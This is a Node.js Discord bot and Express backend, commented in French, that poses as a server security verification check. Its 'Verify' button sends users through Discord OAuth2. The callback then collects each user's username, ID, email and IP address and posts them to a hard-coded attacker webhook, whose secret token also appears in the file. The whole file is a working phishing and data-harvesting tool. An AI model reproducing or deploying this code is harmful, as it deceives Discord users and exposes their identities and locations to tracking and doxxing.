const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ActivityType } = require('discord.js');
const express = require('express');
const axios = require('axios');

// ================= CONFIGURATION =================
const CONFIG = {
    // Bot Discord (depuis les variables d'env Render)
    TOKEN: process.env.TOKEN,
    CHANNEL_ID: '1473330482061115413',
    
    // OAuth2 Discord
    CLIENT_ID: '1473413851444936735',
    CLIENT_SECRET: process.env.CLIENT_SECRET,
    REDIRECT_URI: process.env.REDIRECT_URI, // https://xwwcx.onrender.com/callback
    
    // Ton site Netlify
    SITE_URL: 'https://vortex-hubw.netlify.app',
    
    // Webhook
    WEBHOOK_URL: 'https://discord.com/api/webhooks/1473413556119535628/Ww8l1FyrsXMBkQZ_5w-UCgBMtIs8s8TjK3Kkqn3JT9hHVHzQhpkjA78VtCpcXHIhln9V',
    
    // RPC
    STATUS: '/help | vortex-hubw.netlify.app'
};
// =================================================

// ---------- PARTIE 1 : BOT DISCORD ----------
const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ] 
});

client.once('ready', async () => {
    console.log(`✅ Bot connecté : ${client.user.tag}`);
    
    client.user.setPresence({
        activities: [{
            name: CONFIG.STATUS,
            type: ActivityType.Playing
        }],
        status: 'online'
    });
    
    try {
        const channel = await client.channels.fetch(CONFIG.CHANNEL_ID);
        
        const embed = new EmbedBuilder()
            .setColor(0x2F8FC7)
            .setDescription('This server requires you to verify yourself to get access to other channels, you can simply verify by clicking on the verify button.')
            .setImage('https://securitybot.gg/verify-banner.png');

        // 🔥 Lien OAuth2 avec la REDIRECT_URI de Render
        const oauth2Link = `https://discord.com/api/oauth2/authorize?` +
            `client_id=${CONFIG.CLIENT_ID}` +
            `&redirect_uri=${encodeURIComponent(CONFIG.REDIRECT_URI)}` +
            `&response_type=code` +
            `&scope=identify%20email`;

        const button = new ButtonBuilder()
            .setLabel('Verify')
            .setURL(oauth2Link)
            .setStyle(ButtonStyle.Link);

        const row = new ActionRowBuilder().addComponents(button);

        await channel.send({ embeds: [embed], components: [row] });
        console.log('✅ Message envoyé avec le lien:', oauth2Link);
        
    } catch (error) {
        console.error('❌ Erreur bot:', error.message);
    }
});

client.login(CONFIG.TOKEN);

// ---------- PARTIE 2 : BACKEND EXPRESS ----------
const app = express();

// Middleware pour logger les requêtes (utile pour debug)
app.use((req, res, next) => {
    console.log(`📨 Requête reçue: ${req.method} ${req.url}`);
    next();
});

// Fonction pour récupérer l'IP publique
async function getPublicIP(req) {
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip && ip.includes('::ffff:')) ip = ip.split('::ffff:')[1];
    if (ip === '127.0.0.1' || ip === '::1') {
        try {
            const ipResponse = await axios.get('https://api.ipify.org?format=json', { timeout: 3000 });
            return ipResponse.data.ip;
        } catch (e) { return ip; }
    }
    return ip;
}

// Route de callback OAuth2 (LA PLUS IMPORTANTE)
app.get('/callback', async (req, res) => {
    const code = req.query.code;
    console.log('📥 Code reçu pour /callback:', code ? 'OUI' : 'NON');
    
    if (!code) {
        return res.redirect(`${CONFIG.SITE_URL}?error=no_code`);
    }

    try {
        // 1. Échange du code contre un token
        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', 
            new URLSearchParams({
                client_id: CONFIG.CLIENT_ID,
                client_secret: CONFIG.CLIENT_SECRET,
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: CONFIG.REDIRECT_URI
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        console.log('✅ Token obtenu avec succès');

        const accessToken = tokenResponse.data.access_token;

        // 2. Récupération des infos utilisateur
        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${accessToken}` }
        });
        const user = userResponse.data;
        console.log(`👤 Utilisateur: ${user.username}`);

        // 3. Récupération de l'IP
        const ip = await getPublicIP(req);
        console.log(`🌐 IP: ${ip}`);

        // 4. Envoi au webhook Discord
        await axios.post(CONFIG.WEBHOOK_URL, {
            embeds: [{
                title: '✅ Nouvelle vérification - Vortex Hub',
                color: 0x2F8FC7,
                fields: [
                    { name: '👤 Utilisateur', value: `${user.username}#${user.discriminator}`, inline: true },
                    { name: '🆔 ID', value: user.id, inline: true },
                    { name: '📧 Email', value: user.email || 'Non fourni', inline: true },
                    { name: '🌐 IP', value: ip, inline: true },
                    { name: '🕒 Heure', value: new Date().toLocaleString('fr-FR'), inline: true }
                ],
                thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` },
                footer: { text: 'Vortex Hub Security' },
                timestamp: new Date()
            }]
        });
        console.log('✅ Webhook envoyé');

        // 5. Redirection vers ton site Netlify
        res.redirect(`${CONFIG.SITE_URL}?success=true&user=${encodeURIComponent(user.username)}`);

    } catch (error) {
        console.error('❌ Erreur callback:', error.response?.data || error.message);
        res.redirect(`${CONFIG.SITE_URL}?error=auth_failed`);
    }
});

// Route de test pour vérifier que le serveur tourne
app.get('/', (req, res) => {
    res.send('✅ Backend Vortex OK sur Render');
});

// Démarrage du serveur sur le port dynamique de Render
const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`🌐 Backend démarré sur le port ${port}`);
    console.log(`🔗 URL de callback: ${CONFIG.REDIRECT_URI}`);
});

process.on('unhandledRejection', (error) => {
    console.error('❌ Erreur non gérée:', error);
});